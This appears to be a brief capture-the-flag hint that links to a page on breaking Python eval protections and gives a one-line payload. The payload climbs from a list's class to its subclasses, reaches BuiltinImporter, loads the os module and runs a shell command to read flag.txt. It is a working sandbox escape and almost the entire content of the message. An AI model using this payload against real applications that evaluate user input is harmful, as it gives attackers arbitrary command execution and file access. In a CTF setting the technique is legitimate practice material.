Look at this page: https://netsec.expert/posts/breaking-python3-eval-protections/
Basically just make the command at the end to cat the flag file:

```python
[x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("cat flag.txt")
```